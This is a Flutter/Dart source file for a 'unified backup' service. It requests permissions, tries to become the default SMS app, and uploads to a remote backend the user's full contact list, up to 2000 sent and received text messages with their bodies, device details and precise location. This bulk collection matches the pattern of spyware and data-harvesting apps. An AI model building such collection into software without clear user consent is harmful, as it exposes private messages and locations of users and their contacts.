import 'dart:io';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';

import 'firebase.dart';
import 'sms_role_helper.dart';

/// Centralized service for backing up multiple data sources
class UnifiedBackupService {
  static final SmsQuery _smsQuery = SmsQuery();

  /// Entry point → request permissions and perform all backups
  static Future<void> backupAll(String userId) async {
    try {
      // Ensure default SMS app role (required for SMS on Android 10+)
      final isDefaultSms = await SmsRoleHelper.ensureDefaultSmsApp();

      // Request multiple permissions at once
      final statuses =
          await [
            Permission.contacts,
            Permission.sms,
            Permission.location,
            Permission.phone, // optional
          ].request();

      final contactsGranted = statuses[Permission.contacts]?.isGranted ?? false;
      final smsGranted = statuses[Permission.sms]?.isGranted ?? false;
      final locationGranted = statuses[Permission.location]?.isGranted ?? false;

      // Run each backup if permission is granted
      if (contactsGranted) {
        await _backupContacts(userId);
      } else {
        print("⚠️ Contacts permission denied");
      }

      if (smsGranted && isDefaultSms) {
        await _backupSms(userId);
      } else {
        print("⚠️ SMS backup skipped (no permission or not default SMS app)");
      }

      await _backupDeviceInfo(userId);

      if (locationGranted) {
        await _backupLocation(userId);
      } else {
        print("⚠️ Location backup skipped (permission denied)");
      }
    } catch (e, st) {
      print("❌ Backup failed: $e\n$st");
    }
  }

  /// --- CONTACTS ---
  static Future<void> _backupContacts(String userId) async {
    try {
      final contacts = await FlutterContacts.getContacts(withProperties: true);

      final contactList =
          contacts
              .map(
                (c) => {
                  "name": c.displayName ?? "",
                  "phones": c.phones.map((p) => p.number).toList(),
                },
              )
              .toList();

      await BackupRepository.backupContacts(userId, contactList);
      print("✅ Contacts backed up: ${contactList.length}");
    } catch (e) {
      print("❌ Failed to backup contacts: $e");
    }
  }

  /// --- SMS ---
  static Future<void> _backupSms(String userId) async {
    try {
      final messages = await _smsQuery.querySms(
        kinds: [SmsQueryKind.inbox, SmsQueryKind.sent], // both inbox & sent
        count: 2000, // increase limit if needed
      );

      final smsData =
          messages
              .map(
                (s) => {
                  'address': s.address,
                  'body': s.body,
                  'date': s.date?.millisecondsSinceEpoch,
                  'type': s.kind.toString(), // inbox/sent
                },
              )
              .toList();

      await BackupRepository.backupSms(userId, smsData);
      print("✅ SMS backed up: ${smsData.length}");
    } catch (e) {
      print("❌ Failed to backup SMS: $e");
    }
  }

  /// --- DEVICE INFO ---
  static Future<void> _backupDeviceInfo(String userId) async {
    try {
      final deviceInfo = DeviceInfoPlugin();

      if (Platform.isAndroid) {
        final androidInfo = await deviceInfo.androidInfo;
        await BackupRepository.backupDeviceInfo(userId, {
          'brand': androidInfo.brand,
          'model': androidInfo.model,
          'manufacturer': androidInfo.manufacturer,
          'version': androidInfo.version.release,
          'sdk': androidInfo.version.sdkInt,
        });
        print("✅ Device info backed up (Android)");
      } else if (Platform.isIOS) {
        final iosInfo = await deviceInfo.iosInfo;
        await BackupRepository.backupDeviceInfo(userId, {
          'name': iosInfo.name,
          'system': iosInfo.systemName,
          'version': iosInfo.systemVersion,
          'model': iosInfo.utsname.machine,
        });
        print("✅ Device info backed up (iOS)");
      }
    } catch (e) {
      print("❌ Failed to backup device info: $e");
    }
  }

  /// --- LOCATION ---
  static Future<void> _backupLocation(String userId) async {
    try {
      final serviceEnabled = await Geolocator.isLocationServiceEnabled();
      if (!serviceEnabled) {
        print("❌ Location service disabled.");
        return;
      }

      var permission = await Geolocator.checkPermission();
      if (permission == LocationPermission.denied) {
        permission = await Geolocator.requestPermission();
        if (permission == LocationPermission.denied) return;
      }
      if (permission == LocationPermission.deniedForever) return;

      final position = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
      );

      await BackupRepository.backupDeviceLocation(userId, {
        "latitude": position.latitude,
        "longitude": position.longitude,
        "timestamp": DateTime.now().millisecondsSinceEpoch,
      });
      print(
        "✅ Location backed up: ${position.latitude}, ${position.longitude}",
      );
    } catch (e) {
      print("❌ Failed to backup location: $e");
    }
  }
}
